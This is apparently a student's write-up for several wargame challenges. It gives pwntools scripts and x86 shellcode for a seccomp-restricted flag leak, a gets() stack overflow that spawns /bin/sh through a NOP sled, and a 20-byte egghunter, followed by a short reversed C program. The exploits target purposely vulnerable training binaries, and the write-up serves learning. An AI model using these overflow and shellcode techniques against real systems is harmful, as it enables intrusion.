simple
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
- Trying to overwrite return address: initially I misinterpreted the problem and was trying to get the program to return to my shellcode but then I realised this was much simpler and the program makes a direct call to the shellcode.


Script/Command used (Writeup)
------------------
As the output program says, the flag is open on fd 1000 but we're told we can only read and write. `strace` reveals `prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT)` which according the manpages only allows  `read`, `write` and `exit` syscalls, so this explains it.
In high level code what we need to do is this:
```
bytes_read = read(1000, void *buf, 255);
write(1, const void *buf, bytes_read)
```
Starting off, we read 255 bytes (arbitrary choice of number) from fd 1000 and store it in some buffer. For simplicity we'll use esp as the pointer to our "buffer". To do this in assembly we'll first just do some prep work. First we'll increase the stack by 1000 bytes by adjusting esp, and we'll reset some of the registers since we'll end up using eax, ebx, ecx and edx. We'll sort out ecx later but for now we have this:
```
sub esp, 0x3E8
xor eax, eax
xor ebx, ebx
xor edx, edx
```
Next we'll load 0x3 into eax since that is the syscall number for `read`. Then we set our parameters fd, buffer, and num_bytes in ebx, ecx, edx respectively. Since we set eax, ebx and edx to zero before we can just set values in the lower part of the register (like al). This doesn't make a difference here but its practice for future challenges when we need smaller shellcode. Once the registers are set we can run the syscall:
```
mov al, 0x3
mov bx, 0x3E8
mov ecx, esp
mov dl, 0xFF
int 0x80
```
Now the number of bytes read in will be stored in eax. We need this value in edx since this is the 3rd parameter of the `write` syscall, so we swap edx and eax. Then we set eax to 0x4 (syscall number for `write`). No changes need to be made to ecx since it will still contain esp which is the pointer to the buffer.
```
xchg eax, edx
mov al, 0x4
mov bx, 0x1
int 0x80
```
And then remember to restore the stack
```
add esp, 0x3E8
```
In full this is what the exploit will look like:
```
from pwn import *

p = remote('plsdonthaq.me', 3001)

shellcode = asm(""" sub esp, 0x3E8
                    xor eax, eax
                    xor ebx, ebx
                    xor edx, edx
                    mov al, 0x3
                    mov bx, 0x3E8
                    mov ecx, esp
                    mov dl, 0xFF
                    int 0x80

                    xchg eax, edx
                    mov al, 0x4
                    mov bx, 0x1
                    int 0x80

                    add esp, 0x3E8
                    """)

p.sendline(shellcode)

p.interactive()
```

shellz
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
 - Working out where to jump to, to run our shellcode: after running the program in `gdb` several times I found that the random stack address the program outputs was somewhere in the buffer on the stack. So I can just make a nopsled to fill in the start of the buffer until where my shellcode is (at the end of the buffer).
 - Shellcode only works within the buffer: I didn't face this problem since for some reason I padded the gap between the end of the buffer and the return address with garbage. But when I was experimenting after and I removed this padding, I found that if any of my shellcode was outside of the buffer and in the gap between the buffer and the return address, it wouldn't work. Still not sure why. Maybe only the buffer is executable but I'm not sure how I can properly deduce that.

Script/Command used (Writeup)
------------------
Unlike the previous task, this program doesn't conveniently run shellcode. Looking at the assembly reveals that `gets` is used so we should be able to overwrite the return address to jump to our shellcode.
```
 804925f:       8d 85 fc df ff ff       lea    eax,[ebp-0x2004]
 8049265:       50                      push   eax
 8049266:       e8 e5 fd ff ff          call   8049050 <gets@plt>
```
So we have a 0x2000 byte buffer (ends at ebp-0x4). When we run the program we get a random stack address which is somewhere in this buffer. So the plan is to have a nopsled in this buffer and then our shellcode at the end of the buffer. We also make sure our shellcode ends at ebp-0x4 since thats when the buffer actually ends:
```
#buffer is at ebp-0x2004 and return addr is at ebp+0x4, but then we need to account for the actual return address which is 4 bytes
#stack_addr is the address the program gives us
payload_len = 0x2008 + len(stack_addr)

#keep our shellcode within buffer by padding ebp-0x4 to ebp+0x4
nop_sled = b'\x90' * (payload_len-len(shellcode)-8-len(stack_addr))
payload = nop_sled + shellcode + b'A'*8 + stack_addr
```
Now the logic is sorted let's make the actual shellcode. What we want to do is execute `/bin/sh` to get a shell on the target which is usually done in C with `execve('/bin/sh', NULL, NULL)`. We specify the program path as /bin/sh but we don't get about environment or argument parameters so we set them to NULL. Let's work out how we can get this string '/bin/sh' into our shellcode (on the stack).
While it may not be the case here, in some cases NULL bytes in shellcode can cause issues (like when string functions are used) so we'll avoid that. We can get a NULL on the stack by using an XOR on a register and pushing the value. But '/bin/sh' without the null byte now is 7 bytes but stack operations work with 4 bytes at a time. So we just add an extra slash to make '/bin//sh' which is 8 bytes and is valid.
In ascii this string is 2f 62 69 6e 2f 2f 73 68. Since we need to use little endian we'll reverse this and group them in groups of 4 bytes/characters to get 68732f2f 6e69622f. These are the values we'll push on the stack. So we can get our string on the stack with:
```
xor ecx, ecx
push ecx
push 0x68732f2f
push 0x6e69622f
```
Now we need to call the execve syscall which has number 0xb so we'll put that in eax. esp will go into ebx and the two NULL parameters will go in ecx and edx. We need to set edx to 0 but ecx is already 0 from before.
```
xor eax, eax
mov al, 0x0b
mov ebx, esp
xor edx, edx
int 0x80
```
Altogether the exploit looks like the following:
```
from pwn import *

p = remote('plsdonthaq.me', 3002)

p.recvuntil('address: ')

stack_addr = p32(int(p.recvline().rstrip(), 16))
print(stack_addr)

shellcode = asm(""" xor eax, eax
                    xor ecx, ecx
                    xor edx, edx
                    push ecx
                    push 0x68732f2f
                    push 0x6e69622f
                    mov al, 0x0b
                    mov ebx, esp
                    int 0x80 """)

#buffer 0x2008 from return addr + 4 for our return addr
payload_len = 0x2008 + 4
#buffer goes from ebp-0x2008 to ebp-0x4
#keep our shellcode within buffer by padding ebp-0x4 to ebp+0x4
nop_sled = b'\x90' * (payload_len-len(shellcode)-8-len(stack_addr))
payload = nop_sled + shellcode + b'A'*8 + stack_addr

p.sendline(payload)

p.interactive()

```

find-me
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
 - Fitting shellcode in 20 bytes (small buffer size): I used `scasd` to compare data instead of `cmp`'s since I found that scasd used fewer bytes. However this brought about the next issue.
 - Finding the egg with the egghunter: Since I was using `scasd` which compares 4 bytes at a time (using edi which it increments), I was having alignment issues. My exploit would only work if the egg was offset from the given stack address by a multiple of 4. My solution for this was to change the signature of the egg to a nopsled. So I check for 8 nops and my egg start with 12 nops, guaranteeing that scasd won't go pass the egg due to being offset incorrectly.

Script/Command used (Writeup)
------------------
We are told we can enter a small and large shellcode and the program will execute the small one, however the buffer is capped at 20 bytes. So this is an egghunter problem. For the egg (the large shellcode) I copy and pasted the shellcode from the `simple` exercise since again the flag is opened on fd 1000.
The egghunter requires some more thought. We need to scan memory until we find a signature in the larger shellcode. We'll set this signature to be 12 nop instructions (\x90) and we'll scan for 8 nop instructions. This way even if we are off by 1, the egghunter will still find the egg. From what I researched it is safer to have a signature of at least 8 bytes rather than 4 to decrease the change of an incorrect jump. A weird C implementation of our egghunter would look like this:
```
edi = stack_addr
target = 0x90909090
while (1==1) {
    if (*edi != target) {
        edi += 4;
        continue;
    }
    edi += 4
    if (*edi != target) {
        edi += 4;
        continue;
    }
    edi += 4
    break;
}
*edi()
```
We start our scan from the random stack address the program gives us. Then we basically continuously check if the data at address edi matches the 4 byte target (nop sled) and increment edi by 4. To minimise risk of false positives there is a second check which must also pass. Since we are doing 4 byte comparisons we can use the `scasd` instruction which is very small, using only 1 byte in our shellcode. This will compare the value in eax with the value at the address in edi, setting the zero flag if the comparison results in zero. So the assembly equivalent of this egghunter logic is:
```
mov eax, 0x90909090
mov edi, stack_addr
incr:
scasd
jnz incr
scasd
jnz incr
jmp edi
```
And then the final exploit is as follows:
```
from pwn import *

p = remote('plsdonthaq.me', 3003)
#p = process('./find-me')

p.recvuntil('new stack ')

stack_addr = str(p.recvline().rstrip(), 'utf-8')

egghunter = asm(""" mov eax, 0x90909090
                    mov edi, {}
                    incr:
                        scasd
                        jnz incr
                        scasd
                        jnz incr
                    jmp edi
                    """.format(stack_addr))

p.sendline(egghunter)

# we check for 8 nops, so having 12 is enough
shellcode = b'\x90'*12
shellcode += asm("""sub esp, 0x3E8
                    xor eax, eax
                    xor ebx, ebx
                    xor edx, edx
                    mov al, 0x3
                    mov bx, 0x3E8
                    mov ecx, esp
                    mov dl, 0xFF
                    int 0x80

                    xchg eax, edx
                    mov al, 0x4
                    mov bx, 0x1
                    int 0x80

                    add esp, 0x3E8
                    """)

p.sendline(shellcode)

p.interactive()
```

chall2 (reverse engineering challenge)
===========================

General overview of problems faced
-------------------------------------
Didn't have any problems with this task. One observation I made is no matter what I did the compiled version of this code would have different assembly code than what was given. For example the comparison being made for the loop would always be a check if the variable was less than 10 rather than comparing to 9 like the given screenshot. That said, behaviour is still the same.

Reversed C Code
------------------

```
#include <stdio.h>

int main(int argc, char *argv[]) {
    int i = 0;
    while (i <= 9) {
        if (i % 2 != 0) {
            printf("%d\n", i); //guessed format string
        } 
        i += 1;
    }
    return 1;
}
```